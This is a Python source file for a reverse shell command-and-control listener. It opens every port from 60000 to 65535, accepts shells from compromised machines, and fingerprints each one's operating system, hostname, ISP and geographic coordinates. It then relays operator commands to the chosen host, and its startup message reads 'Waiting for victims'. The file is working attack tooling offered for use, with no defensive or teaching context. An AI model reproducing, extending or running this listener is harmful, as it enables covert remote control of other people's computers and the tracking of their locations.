#!/usr/bin/env python3
"""
Enhanced Reverse Shell Listener - 2026 Version
Starts listening from port 60000 to match Flask app
"""

import socket
import threading
import sys
import time
import json
import os
import signal
from datetime import datetime
import geoip2.database
import geoip2.errors
import requests

# ==================== ANSI COLORS ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ==================== GEOIP MANAGER ====================
class GeoIPManager:
    def __init__(self):
        self.db_reader = None
        self.db_path = None
        self.load_database()
    
    def load_database(self):
        """Try to load GeoLite2 database"""
        possible_paths = [
            './GeoLite2-City.mmdb',
            './GeoLite2-Country.mmdb',
            '/usr/share/GeoIP/GeoLite2-City.mmdb',
            '/usr/local/share/GeoIP/GeoLite2-City.mmdb',
            os.path.expanduser('~/.local/share/GeoIP/GeoLite2-City.mmdb')
        ]
        
        for path in possible_paths:
            try:
                if os.path.exists(path):
                    self.db_reader = geoip2.database.Reader(path)
                    self.db_path = path
                    print(f"{Colors.GREEN}✓ Loaded GeoIP2 database from: {path}{Colors.END}")
                    return
            except:
                continue
        
        print(f"{Colors.YELLOW}⚠ No GeoIP2 database found. Using HTTP API.{Colors.END}")
    
    def get_location(self, ip):
        """Get location info"""
        location = {
            'country': 'Unknown',
            'region': 'Unknown',
            'city': 'Unknown',
            'latitude': None,
            'longitude': None,
            'isp': 'Unknown',
            'source': None
        }
        
        # Try local database first
        if self.db_reader:
            try:
                response = self.db_reader.city(ip)
                location.update({
                    'country': response.country.name or 'Unknown',
                    'region': response.subdivisions.most_specific.name if response.subdivisions else 'Unknown',
                    'city': response.city.name or 'Unknown',
                    'latitude': response.location.latitude,
                    'longitude': response.location.longitude,
                    'source': 'GeoIP2 Database'
                })
                return location
            except:
                pass
        
        # Fallback to HTTP API
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    location.update({
                        'country': data.get('country', 'Unknown'),
                        'region': data.get('regionName', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'latitude': data.get('lat'),
                        'longitude': data.get('lon'),
                        'isp': data.get('isp', 'Unknown'),
                        'source': 'ip-api.com'
                    })
        except:
            pass
        
        return location

# ==================== DEVICE CLASS ====================
class Device:
    def __init__(self, device_id, ip, port, client_socket, geoip):
        self.id = device_id
        self.ip = ip
        self.port = port
        self.socket = client_socket
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.active = True
        self.reconnections = 0
        self.os = self.detect_os()
        self.hostname = self.get_hostname()
        self.commands = []
        self.notes = ""
        self.geoip = geoip
        self.location = self.geoip.get_location(ip)
    
    def get_hostname(self):
        try:
            return socket.gethostbyaddr(self.ip)[0]
        except:
            return "Unknown"
    
    def detect_os(self):
        """Detect operating system"""
        try:
            self.socket.settimeout(2)
            self.socket.send(b'uname -a\n')
            time.sleep(0.5)
            response = self.socket.recv(1024).decode()
            if 'Linux' in response:
                return 'Linux'
            elif 'Darwin' in response:
                return 'macOS'
            
            self.socket.send(b'ver\n')
            time.sleep(0.5)
            response = self.socket.recv(1024).decode()
            if 'Windows' in response:
                return 'Windows'
        except:
            pass
        return 'Unknown'
    
    def get_location_string(self):
        if self.location['city'] != 'Unknown':
            return f"{self.location['city']}, {self.location['region']}, {self.location['country']}"
        elif self.location['country'] != 'Unknown':
            return self.location['country']
        return "Location Unknown"
    
    def get_coordinates(self):
        if self.location['latitude'] and self.location['longitude']:
            return f"{self.location['latitude']:.4f}, {self.location['longitude']:.4f}"
        return "Unknown"

# ==================== MAIN LISTENER CLASS ====================
class ReverseShellListener:
    def __init__(self, start_port=60000, end_port=65535):
        """Initialize listener with start_port=60000 to match Flask"""
        self.start_port = start_port
        self.end_port = end_port
        self.devices = {}
        self.next_id = 1
        self.current_id = None
        self.lock = threading.Lock()
        self.running = True
        self.geoip = GeoIPManager()
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}║     🌍 REVERSE SHELL LISTENER - 2026                      ║{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}║         Listening from port 60000                         ║{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        print(f"\n{Colors.BOLD}Configuration:{Colors.END}")
        print(f"  Start Port: {self.start_port} (matching Flask)")
        print(f"  End Port: {self.end_port}")
        print(f"  Total Ports: {self.end_port - self.start_port + 1}")
        print(f"  Type '{Colors.CYAN}help{Colors.END}' for commands\n")
    
    def add_device(self, ip, port, client_socket):
        with self.lock:
            # Check for existing device
            for device in self.devices.values():
                if device.ip == ip and device.active:
                    device.reconnections += 1
                    device.last_seen = datetime.now()
                    device.socket = client_socket
                    return device.id
            
            # New device
            device_id = self.next_id
            self.next_id += 1
            self.devices[device_id] = Device(device_id, ip, port, client_socket, self.geoip)
            
            # Print location info
            device = self.devices[device_id]
            print(f"\n{Colors.GREEN}📍 NEW DEVICE CONNECTED!{Colors.END}")
            print(f"{Colors.BOLD}{'═'*60}{Colors.END}")
            print(f"  ID:       {device_id}")
            print(f"  IP:       {device.ip}")
            print(f"  Port:     {device.port}")
            print(f"  OS:       {device.os}")
            print(f"  Hostname: {device.hostname}")
            print(f"  Location: {device.get_location_string()}")
            print(f"  Coordinates: {device.get_coordinates()}")
            if device.location.get('isp', 'Unknown') != 'Unknown':
                print(f"  ISP:      {device.location['isp']}")
            print(f"{Colors.BOLD}{'═'*60}{Colors.END}")
            print(f"  Type 'list' to see all devices")
            print(f"  Type 'use {device_id}' to interact\n")
            
            return device_id
    
    def remove_device(self, device_id):
        with self.lock:
            if device_id in self.devices:
                self.devices[device_id].active = False
                self.devices[device_id].socket = None
                if self.current_id == device_id:
                    self.current_id = None
                print(f"{Colors.YELLOW}[-] Device {device_id} disconnected{Colors.END}")
    
    def list_devices(self):
        if not self.devices:
            return f"{Colors.YELLOW}No devices connected yet{Colors.END}"
        
        result = f"\n{Colors.BOLD}{'═'*100}{Colors.END}\n"
        result += f"{Colors.BOLD}{'ID':<4} {'IP':<16} {'Location':<35} {'OS':<10} {'Status':<10} {'Last Seen'}{Colors.END}\n"
        result += f"{Colors.BOLD}{'═'*100}{Colors.END}\n"
        
        for device in self.devices.values():
            marker = f"{Colors.GREEN}→{Colors.END} " if self.current_id == device.id else "  "
            status = f"{Colors.GREEN}● ACTIVE{Colors.END}" if device.active else f"{Colors.RED}○ OFFLINE{Colors.END}"
            
            location = device.get_location_string()
            if len(location) > 34:
                location = location[:31] + "..."
            
            last_seen = device.last_seen.strftime('%H:%M:%S')
            
            result += f"{marker}{device.id:<2} {device.ip:<16} {location:<35} {device.os:<10} {status:<10} {last_seen}\n"
        
        result += f"{Colors.BOLD}{'═'*100}{Colors.END}\n"
        active = len([d for d in self.devices.values() if d.active])
        result += f"Total: {len(self.devices)} devices ({active} active)\n"
        
        return result
    
    def handle_device_session(self, client_socket, addr, port):
        device_id = self.add_device(addr[0], port, client_socket)
        
        try:
            while self.running:
                if self.current_id == device_id:
                    device = self.devices[device_id]
                    location = device.get_location_string()
                    
                    prompt = f"\n{Colors.CYAN}device[{device_id}:{addr[0]} - {location}]>{Colors.END} "
                    cmd = input(prompt)
                    
                    if cmd.lower() == 'back':
                        self.current_id = None
                        print(f"{Colors.YELLOW}Returned to main menu{Colors.END}")
                        continue
                    
                    elif cmd.lower() == 'exit':
                        client_socket.send(b'exit\n')
                        break
                    
                    elif cmd.lower() == 'info':
                        print(f"\n{Colors.BOLD}Device {device_id} Details:{Colors.END}")
                        print(f"  IP: {device.ip}")
                        print(f"  Port: {device.port}")
                        print(f"  OS: {device.os}")
                        print(f"  Location: {device.get_location_string()}")
                        print(f"  First Seen: {device.first_seen.strftime('%H:%M:%S')}")
                        print(f"  Commands: {len(device.commands)}")
                    
                    elif cmd.startswith('note '):
                        device.notes = cmd[5:]
                        print(f"{Colors.GREEN}Note saved{Colors.END}")
                    
                    else:
                        try:
                            client_socket.send(cmd.encode() + b'\n')
                            device.commands.append(cmd)
                            device.last_seen = datetime.now()
                            
                            response = client_socket.recv(8192)
                            if response:
                                print(response.decode(), end='')
                        except:
                            print(f"{Colors.RED}Connection lost{Colors.END}")
                            break
                else:
                    time.sleep(1)
                    
        except Exception as e:
            print(f"{Colors.RED}Error: {e}{Colors.END}")
        finally:
            self.remove_device(device_id)
            client_socket.close()
    
    def start(self):
        """Start listening on all ports from start_port to end_port"""
        
        # Start listeners for each port in range
        for port in range(self.start_port, self.end_port + 1):
            def listen_port(p):
                try:
                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    server.bind(('0.0.0.0', p))
                    server.listen(5)
                    
                    while self.running:
                        try:
                            client, addr = server.accept()
                            thread = threading.Thread(
                                target=self.handle_device_session,
                                args=(client, addr, p)
                            )
                            thread.daemon = True
                            thread.start()
                        except:
                            pass
                except:
                    pass  # Port might be in use
            
            t = threading.Thread(target=listen_port, args=(port,))
            t.daemon = True
            t.start()
            
            # Show progress
            if port % 1000 == 0:
                print(f"  Listening on ports up to {port}")
        
        print(f"\n{Colors.GREEN}✓ Now listening on ports {self.start_port}-{self.end_port}{Colors.END}")
        print(f"{Colors.YELLOW}Waiting for victims... (Press Ctrl+C to stop){Colors.END}\n")
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
            self.running = False

# ==================== MAIN ====================
if __name__ == "__main__":
    # Start listener from port 60000 (matching Flask)
    listener = ReverseShellListener(start_port=60000, end_port=65535)
    
    def signal_handler(sig, frame):
        print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
        listener.running = False
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    listener.start()
